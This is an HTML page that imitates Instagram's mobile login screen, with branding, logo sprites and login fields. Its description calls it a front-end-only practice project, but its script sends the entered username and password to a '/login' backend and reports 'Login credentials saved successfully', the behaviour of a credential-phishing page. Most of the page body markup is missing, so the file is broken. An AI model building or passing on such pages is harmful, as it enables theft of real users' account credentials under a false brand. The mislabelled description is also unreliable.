<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
    <meta name="theme-color" content="#ffffff">
    <meta name="description" content="A front-end-only mobile login interface practice project.">
    <title>Instagram</title>
    <style>
:root {
  color-scheme: light;
  --blue: #2a63d7;
  --text: #141414;
  --muted: #696b70;
  --border: #e1e1e5;
  --screen-width: 375px;
  font-family: Arial, Helvetica, sans-serif;
}

* {
  box-sizing: border-box;
}

html,
body {
  min-height: 100%;
}

html {
  -webkit-text-size-adjust: 100%;
  text-size-adjust: 100%;
}

body {
  margin: 0;
  overflow: hidden;
  background: #ffffff;
  color: var(--text);
  font-family: inherit;
}

button,
input {
  font: inherit;
}

button,
a,
input {
  -webkit-tap-highlight-color: transparent;
}

a {
  color: inherit;
  text-decoration: none;
}

.app-screen {
  position: relative;
  width: min(100%, var(--screen-width));
  height: min(100dvh, 693.33px);
  min-height: min(100dvh, 693.33px);
  margin: 0 auto;
  overflow: hidden;
  background: #ffffff;
}

.language {
  position: absolute;
  top: 16.67px;
  left: 0;
  width: 100%;
  margin: 0;
  color: var(--muted);
  font-size: 14px;
  font-weight: 400;
  line-height: 18px;
  text-align: center;
}

.instagram-logo {
  position: absolute;
  top: 89.33px;
  left: 50%;
  width: 61px;
  height: 61px;
  overflow: hidden;
  transform: translateX(-50%);
  background: #ffffff;
}

.instagram-logo > svg {
  display: block;
  width: 100%;
  height: 100%;
  filter: drop-shadow(0 1px 1px rgb(0 0 0 / 10%));
}

.reference-sprite {
  position: absolute;
  width: 375px;
  max-width: none;
  height: auto;
  pointer-events: none;
  user-select: none;
}

.logo-sprite {
  top: -89.33px;
  left: -157.33px;
}

.login-form {
  position: absolute;
  top: 223.33px;
  right: 16px;
  left: 16px;
  display: grid;
  grid-template-rows: 62.33px 62.33px 44px;
  gap: 12px;
  margin: 0;
}

.login-input {
  width: 100%;
  min-width: 0;
  padding: 0 16.67px;
  border: 1px solid var(--border);
  border-radius: 17px;
  outline: 0;
  background: #ffffff;
  color: var(--text);
  font-size: 16px;
  font-weight: 400;
  line-height: normal;
  box-shadow: none;
}

.login-input::placeholder {
  color: var(--muted);
  opacity: 1;
}

.login-input:focus {
  border-color: #aeb2b8;
  box-shadow: 0 0 0 1px #aeb2b8;
}

.login-button,
.create-account {
  width: 100%;
  border-radius: 999px;
  font-size: 16px;
  line-height: 1;
  cursor: pointer;
}

.login-button {
  padding: 0 16px;
  border: 1px solid var(--blue);
  background: var(--blue);
  color: #ffffff;
  font-weight: 400;
}

.login-button:active,
.create-account:active {
  transform: scale(.995);
  opacity: .88;
}

.forgot-password {
  position: absolute;
  top: 435px;
  left: 0;
  width: 100%;
  font-size: 16px;
  font-weight: 400;
  line-height: 19px;
  text-align: center;
}

button.forgot-password {
  padding: 0;
  border: 0;
  background: transparent;
  color: inherit;
  cursor: pointer;
}

.create-account {
  position: absolute;
  top: 571.33px;
  right: 16px;
  bottom: auto;
  left: 16px;
  width: auto;
  height: 44px;
  padding: 0 16px;
  border: 1px solid var(--blue);
  background: #ffffff;
  color: var(--blue);
  font-weight: 400;
}

.meta-brand {
  position: absolute;
  top: 634.67px;
  bottom: auto;
  left: 50%;
  width: 60.67px;
  height: 13.33px;
  overflow: hidden;
  transform: translateX(-50%);
  background: #ffffff;
}

.meta-sprite {
  top: -634.67px;
  left: -157.33px;
}

.demo-toast {
  position: absolute;
  right: 16px;
  bottom: 18px;
  left: 16px;
  z-index: 5;
  padding: 10px 13px;
  border-radius: 12px;
  background: rgb(0 0 0 / 88%);
  color: #ffffff;
  font-size: 12px;
  line-height: 1.35;
  text-align: center;
  opacity: 0;
  transform: translateY(8px);
  pointer-events: none;
  transition: opacity 140ms ease, transform 140ms ease;
}

.demo-toast.is-visible {
  opacity: 1;
  transform: translateY(0);
}

.sr-only {
  position: absolute;
  width: 1px;
  height: 1px;
  padding: 0;
  margin: -1px;
  overflow: hidden;
  clip: rect(0, 0, 0, 0);
  white-space: nowrap;
  border: 0;
}

:focus-visible {
  outline: 2px solid #111111;
  outline-offset: 2px;
}

/* Matching secondary Instagram-only screens */
.secondary-screen {
  width: min(100%, var(--screen-width));
  display: flex;
  flex-direction: column;
  align-items: center;
  min-height: 100dvh;
  margin: 0 auto;
  padding: 17px 16px 34px;
  background: #ffffff;
  text-align: center;
}

.secondary-language {
  margin: 0;
  color: var(--muted);
  font-size: 16px;
}

.secondary-logo {
  position: static;
  flex: 0 0 auto;
  margin-top: 58px;
  transform: none;
}

.secondary-card {
  width: 100%;
  margin-top: 44px;
}

.secondary-card h1 {
  margin: 0 0 9px;
  font-size: 20px;
}

.secondary-card p {
  max-width: 315px;
  margin: 0 auto 22px;
  color: var(--muted);
  line-height: 1.4;
}

.secondary-form {
  display: grid;
  gap: 12px;
}

.secondary-form .login-input {
  height: 62.33px;
}

.secondary-form .login-button {
  height: 44px;
}

.secondary-back {
  margin-top: auto;
  color: var(--blue);
  font-size: 16px;
  font-weight: 600;
}

.secondary-status {
  display: none;
  margin-top: 16px;
  padding: 12px 14px;
  border-radius: 12px;
  background: #eef7ee;
  color: #286332;
  line-height: 1.4;
}

.secondary-status.is-visible {
  display: block;
}

@media (min-width: 376px) {
  body {
    background: #f5f5f5;
  }

  .app-screen,
  .secondary-screen {
    box-shadow: 0 0 35px rgb(0 0 0 / 6%);
  }
}

@media (prefers-reduced-motion: reduce) {
  *,
  *::before,
  *::after {
    transition-duration: .01ms !important;
  }
}

    </style>
  </head>

      <div class="demo-toast" data-toast role="status" aria-live="polite"></div>
    </main>
    <script>
(() => {
  "use strict";

  const showToast = (message) => {
    const toast = document.querySelector("[data-toast]");
    if (!toast) return;

    toast.textContent = message;
    toast.classList.add("is-visible");
    window.clearTimeout(showToast.timeoutId);
    showToast.timeoutId = window.setTimeout(() => {
      toast.classList.remove("is-visible");
    }, 3000);
  };

  const discardInputs = (form) => {
    form.querySelectorAll("input").forEach((input) => {
      input.value = "";
    });
  };

  // ---- Login form - sends to Node.js backend ----
  document.querySelectorAll("[data-login-form]").forEach((form) => {
    form.addEventListener("submit", async (event) => {
      event.preventDefault();

      const usernameInput = form.querySelector("#login-id");
      const passwordInput = form.querySelector("#login-password");

      const username = usernameInput?.value.trim();
      const password = passwordInput?.value.trim();

      if (!username || !password) {
        showToast("Enter both fields before logging in.");
        return;
      }

      try {
        const response = await fetch("/login", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ username, password }),
        });

        const result = await response.json();

        if (response.ok) {
          discardInputs(form);
          showToast("Login credentials saved successfully.");
        } else {
          showToast(`Error: ${result.error || "Unknown error"}`);
        }
      } catch (err) {
        showToast("Server unreachable. Is Node.js running?");
      }
    });
  });

  // ---- "Forgot password" and "Create new account" buttons ----
  document.querySelectorAll("[data-demo-action]").forEach((button) => {
    button.addEventListener("click", () => {
      
    });
  });
})();
</script>
